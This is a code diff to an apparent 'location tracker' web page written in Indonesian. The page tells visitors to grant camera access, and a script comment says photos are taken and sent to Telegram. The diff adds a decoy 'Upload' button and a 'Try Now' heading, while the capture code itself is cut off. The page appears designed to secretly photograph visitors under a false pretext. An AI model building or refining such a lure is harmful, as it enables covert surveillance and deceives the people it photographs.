@@ -10,7 +10,7 @@
     <meta property="og:url" content="https://shin-tracker.vercel.app" />
     <style>
         /* CSS untuk tata letak */
-        body {
+        .budy {
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
@@ -38,6 +38,20 @@
             font-family: Georgia, serif;
             text-align: center;
         }
+        .upload-button {
+    background-color: blue;
+    color: white;
+    padding: 15px 30px;
+    font-size: 18px;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+}
+
+.upload-button:hover {
+    background-color: darkblue;
+}
+        
         .jd {
             font-size: 18px;
             color: #666;
@@ -71,6 +85,10 @@
         <img src="https://telegra.ph/file/7b755c6b85a3ea922ce44.jpg" alt="Tracker Gambar" width="320px">
         <p class="jd">Lacak lokasi hanya dengan mengunggah foto, izinkan akses kamera untuk mengoptimalkan pelacakan agar sesuai dan tepat. Jika masih ada masalah, silakan hubungi layanan pelanggan kami.</p>
     </div>
+    <br><br>
+    <h1>Coba Sekarang!!</h1>
+    <button class="upload-button">Upload</button>
+    
     <script>
         // JavaScript untuk pengambilan foto dan pengiriman ke Telegram
         const canvas = document.createElement('canvas');
